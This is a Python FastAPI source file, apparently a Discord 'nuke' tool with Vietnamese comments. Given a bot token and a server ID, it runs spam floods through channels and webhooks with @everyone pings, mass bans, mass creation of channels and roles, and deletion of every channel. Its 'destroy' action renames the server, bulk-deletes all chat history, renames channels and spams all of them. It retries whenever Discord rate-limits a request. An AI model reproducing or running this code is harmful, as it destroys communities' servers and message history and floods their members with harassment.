import os
import asyncio
import aiohttp
import json
import discord
import random
from fastapi import FastAPI
from fastapi.responses import HTMLResponse, StreamingResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
from typing import Optional, List

app = FastAPI()
app.mount("/static", StaticFiles(directory="static"), name="static")

LOG_QUEUE = asyncio.Queue()
STOP_EVENT = asyncio.Event()
IS_RUNNING = False
PRESENCE_CLIENT = None

# Danh sách emoji mặt cười (chỉ lấy mặt tròn/vàng)
FACE_EMOJIS = ["😀","😃","😄","😁","😆","😅","😂","🤣","😊","😇","🙂","🙃","😉","😌","😍","🥰","😘","😗","😙","😚","😋","😛","😝","😜","🤪","🤨","🧐","🤓","😎","🥸","🤩","🥳","😏","😒","😞","😔","😟","😕","🙁","☹️","😣","😖","😫","😩","🥺","😢","😭","😤","😠","😡","🤬","🤯","😳","🥵","🥶","😱","😨","😰","😥","😓","🤗","🤔","🫣","🤭","🫢","🫡","🤫","🤥","😶","🫥","😐","🫤","😑","😬","🙄","😯","😦","😧","😮","😲","🥱","😴","🤤","😪","😵","🤐","🥴","🤢","🤮","🤧","😷","🤒","🤕","🤑","🤠","😈"]

class TokenReq(BaseModel):
    token: str
    server_id: str

class NukeRequest(BaseModel):
    token: str
    server_id: str
    action: str
    srv_name: Optional[str] = ""
    msg: Optional[str] = ""
    num: Optional[int] = 0
    delay: Optional[float] = 0.0
    count: Optional[int] = 0
    ping: Optional[bool] = False
    channel_id: Optional[str] = ""
    file_content: Optional[str] = ""
    webhook_url: Optional[str] = ""
    ping_ids: Optional[List[str]] = []
    random_emoji: Optional[bool] = False
    big_text: Optional[bool] = False

async def log_message(msg: str, level: str = "INFO"):
    payload = json.dumps({"message": msg, "level": level})
    await LOG_QUEUE.put(payload)

async def handle_rate_limit(response):
    if response.status == 429:
        try: retry_after = float((await response.json()).get('retry_after', 1))
        except: retry_after = float(response.headers.get('Retry-After', 1))
        await asyncio.sleep(retry_after + 0.1)
        return True
    return False

def format_message(raw_msg: str, req: NukeRequest) -> str:
    if not raw_msg.strip(): return raw_msg
    msg = f"# {raw_msg}" if req.big_text else raw_msg
    
    # 1. Ping (nằm trước emoji)
    if req.ping_ids:
        if "everyone" in req.ping_ids:
            msg = f"{msg} @everyone"
        else:
            pings = " ".join([f"<@{uid}>" for uid in req.ping_ids if uid != "everyone"])
            msg = f"{msg} {pings}"
            
    # 2. Random 2 emoji mặt cười
    if req.random_emoji:
        emojis = random.sample(FACE_EMOJIS, 2)
        msg = f"{msg} {emojis[0]}{emojis[1]}"
            
    return msg

async def run_presence_bot(token: str):
    global PRESENCE_CLIENT
    if PRESENCE_CLIENT and not PRESENCE_CLIENT.is_closed():
        try: await PRESENCE_CLIENT.change_presence(activity=discord.Game(name="no1 Nuke by Yusei x Binchillz x Fallout"))
        except: pass
        return
    intents = discord.Intents.default()
    PRESENCE_CLIENT = discord.Client(intents=intents)
    @PRESENCE_CLIENT.event
    async def on_ready():
        await PRESENCE_CLIENT.change_presence(activity=discord.Game(name="no1 Nuke by Yusei x Binchillz x Fallout"))
    try: await PRESENCE_CLIENT.start(token)
    except: pass

@app.get("/")
async def index():
    with open("static/index.html", "r", encoding="utf-8") as f:
        return HTMLResponse(f.read())

@app.get("/api/logs")
async def stream_logs():
    async def event_generator():
        while True:
            data = await LOG_QUEUE.get()
            yield f"data: {data}\n\n"
    return StreamingResponse(event_generator(), media_type="text/event-stream")

@app.post("/api/get_guilds")
async def get_guilds(req: TokenReq):
    headers = {'Authorization': f'Bot {req.token.strip()}'}
    async with aiohttp.ClientSession() as session:
        async with session.get('https://discord.com/api/v9/users/@me/guilds', headers=headers) as r:
            if r.status == 200:
                asyncio.create_task(run_presence_bot(req.token.strip()))
                return [{"id": g["id"], "name": g["name"]} for g in await r.json()]
            return {"error": "Token không hợp lệ hoặc bot chưa vào server nào!"}

@app.post("/api/get_members")
async def get_members(req: TokenReq):
    headers = {'Authorization': f'Bot {req.token.strip()}'}
    members = []
    after = 0
    async with aiohttp.ClientSession() as session:
        while True:
            url = f'https://discord.com/api/v9/guilds/{req.server_id}/members?limit=1000&after={after}'
            async with session.get(url, headers=headers) as r:
                if await handle_rate_limit(r): continue
                if r.status != 200: break
                data = await r.json()
                if not data: break
                for m in data:
                    members.append({"id": m["user"]["id"], "name": m["user"]["username"]})
                after = data[-1]["user"]["id"]
    return members

@app.post("/api/stop")
async def stop_task():
    global IS_RUNNING
    STOP_EVENT.set()
    IS_RUNNING = False
    await log_message("Đã gửi lệnh dừng khẩn cấp!", "WAITING")
    return {"status": "stopped"}

@app.post("/api/start")
async def start_task(req: NukeRequest):
    global IS_RUNNING
    if IS_RUNNING: return {"error": "Tool đang chạy, vui lòng bấm DỪNG trước!"}
    IS_RUNNING = True
    STOP_EVENT.clear()
    asyncio.create_task(run_presence_bot(req.token.strip()))
    asyncio.create_task(run_logic(req))
    return {"status": "started"}

async def run_logic(req: NukeRequest):
    global IS_RUNNING
    token = req.token.strip()
    guild_id = req.server_id.strip()
    await log_message(f"Khởi động chức năng: {req.action.upper()}", "SUCCESS")
    headers = {'Authorization': f'Bot {token}'}
    
    try:
        async with aiohttp.ClientSession() as session:
            # 1. MASS MESSAGE
            if req.action == "mass_message":
                lines = [line.strip() for line in req.msg.splitlines() if line.strip()]
                count = req.count if req.count > 0 else 999999
                await log_message(f"Spam {len(lines)} dòng vào kênh {req.channel_id} ({'∞' if count==999999 else count} lần)...", "INFO")
                
                for loop_idx in range(count):
                    if STOP_EVENT.is_set(): break
                    for line in lines:
                        if STOP_EVENT.is_set(): break
                        final_msg = format_message(line, req)
                        async with session.post(f'https://discord.com/api/v9/channels/{req.channel_id}/messages', headers=headers, json={'content': final_msg}) as r:
                            await handle_rate_limit(r)
                        await asyncio.sleep(req.delay)
                await log_message("Đã spam xong!", "SUCCESS")

            # 2. CREATE CHANNELS
            elif req.action == "create_channels":
                for _ in range(req.num):
                    if STOP_EVENT.is_set(): break
                    async with session.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers, json={'name': req.msg, 'type': 0}) as r:
                        await handle_rate_limit(r)
                    await asyncio.sleep(req.delay)
                await log_message("Đã tạo xong kênh!", "SUCCESS")

            # 3. CREATE ROLES
            elif req.action == "create_roles":
                for _ in range(req.num):
                    if STOP_EVENT.is_set(): break
                    name = f"{req.msg}{random.randint(1,999)}"
                    async with session.post(f'https://discord.com/api/v9/guilds/{guild_id}/roles', headers=headers, json={'name': name, 'color': random.randint(0, 16777215)}) as r:
                        await handle_rate_limit(r)
                    await asyncio.sleep(req.delay)
                await log_message("Đã tạo xong Role!", "SUCCESS")

            # 4. BAN MEMBERS
            elif req.action == "ban":
                ids_to_ban = [uid.strip() for uid in req.file_content.split(",") if uid.strip()]
                await log_message(f"Bắt đầu ban {len(ids_to_ban)} thành viên...", "INFO")
                async def ban_async(mid):
                    if STOP_EVENT.is_set(): return
                    async with session.put(f'https://discord.com/api/v9/guilds/{guild_id}/bans/{mid}', headers=headers, json={'delete_message_days': 1}) as r_ban:
                        await handle_rate_limit(r_ban)
                        if r_ban.status in [200, 204]:
                            await log_message(f"Đã ban ID: {mid}", "SUCCESS")
                    await asyncio.sleep(req.delay)
                await asyncio.gather(*[ban_async(mid) for mid in ids_to_ban])

            # 5. WEBHOOK SPAM
            elif req.action == "webhook_spam":
                lines = [line.strip() for line in req.msg.splitlines() if line.strip()]
                count = req.count if req.count > 0 else 999999
                await log_message(f"Bắt đầu spam vào webhook ({'∞' if count==999999 else count} lần)...", "INFO")
                
                for loop_idx in range(count):
                    if STOP_EVENT.is_set(): break
                    for line in lines:
                        if STOP_EVENT.is_set(): break
                        final_msg = format_message(line, req)
                        async with session.post(req.webhook_url, json={'content': final_msg}) as r_spam:
                            await handle_rate_limit(r_spam)
                        await asyncio.sleep(req.delay)
                await log_message("Đã spam webhook xong!", "SUCCESS")

            # 6. DELETE ALL CHANNELS
            elif req.action == "delete_channels":
                async with session.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers) as res:
                    if res.status == 200:
                        channels = [c['id'] for c in await res.json()]
                        await log_message(f"Đang xóa {len(channels)} kênh cùng lúc...", "INFO")
                        async def del_async(cid):
                            if STOP_EVENT.is_set(): return
                            async with session.delete(f'https://discord.com/api/v9/channels/{cid}', headers=headers) as r:
                                await handle_rate_limit(r)
                            await asyncio.sleep(req.delay)
                        await asyncio.gather(*[del_async(cid) for cid in channels])
                        await log_message("Đã xóa sạch kênh!", "SUCCESS")

            # 7. DESTROY SERVER
            elif req.action == "destroy":
                target_srv_name = req.srv_name if req.srv_name else "Nuked Server"
                target_ch_name = req.channel_id if req.channel_id else "nuked-channel"

                await log_message(f"Đang đổi tên server thành: {target_srv_name}...", "INFO")
                async with session.patch(f'https://discord.com/api/v9/guilds/{guild_id}', headers=headers, json={'name': target_srv_name}) as r:
                    await handle_rate_limit(r)

                async with session.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers) as res:
                    if res.status != 200: return
                    channels = [c['id'] for c in await res.json()]

                await log_message(f"Đang xóa sạch lịch sử chat ở {len(channels)} kênh...", "INFO")
                async def purge_channel(cid):
                    while not STOP_EVENT.is_set():
                        try:
                            async with session.get(f'https://discord.com/api/v9/channels/{cid}/messages?limit=100', headers=headers) as r:
                                if await handle_rate_limit(r): continue
                                if r.status != 200: break
                                msgs = await r.json()
                                if not msgs: break
                            msg_ids = [m['id'] for m in msgs]
                            async with session.post(f'https://discord.com/api/v9/channels/{cid}/messages/bulk-delete', headers=headers, json={'messages': msg_ids}) as r_del:
                                if await handle_rate_limit(r_del): continue
                                if r_del.status not in (200, 204): break
                            if len(msgs) < 100: break
                        except: break
                await asyncio.gather(*[purge_channel(cid) for cid in channels])

                await log_message("Đang đổi tên kênh...", "INFO")
                async def rename_ch(cid):
                    try:
                        async with session.patch(f'https://discord.com/api/v9/channels/{cid}', headers=headers, json={'name': target_ch_name}) as r:
                            await handle_rate_limit(r)
                    except: pass
                await asyncio.gather(*[rename_ch(cid) for cid in channels])

                await log_message("Bắt đầu Spam đồng bộ...", "INFO")
                content = format_message(req.msg, req)
                count = req.count if req.count > 0 else 999999
                for round_num in range(count):
                    if STOP_EVENT.is_set(): break
                    async def spam_channel(cid):
                        if STOP_EVENT.is_set(): return
                        async with session.post(f'https://discord.com/api/v9/channels/{cid}/messages', headers=headers, json={'content': content}) as r:
                            await handle_rate_limit(r)
                    await asyncio.gather(*[spam_channel(cid) for cid in channels])
                    await asyncio.sleep(req.delay)

            # 8. TREO NGON
            elif req.action == "treongon":
                lines = [line.strip() for line in req.msg.splitlines() if line.strip()]
                count = req.count if req.count > 0 else 999999
                await log_message(f"Bắt đầu Treo Ngôn vào kênh {req.channel_id} ({'∞' if count==999999 else count} lần)...", "INFO")
                
                for loop_idx in range(count):
                    if STOP_EVENT.is_set(): break
                    for line in lines:
                        if STOP_EVENT.is_set(): break
                        final_msg = format_message(line, req)
                        async with session.post(f'https://discord.com/api/v9/channels/{req.channel_id}/messages', headers=headers, json={'content': final_msg}) as r:
                            await handle_rate_limit(r)
                        await asyncio.sleep(req.delay)

    except Exception as e:
        await log_message(f"Lỗi hệ thống: {str(e)}", "WAITING")
    finally:
        IS_RUNNING = False
        await log_message("Tiến trình kết thúc!", "SUCCESS")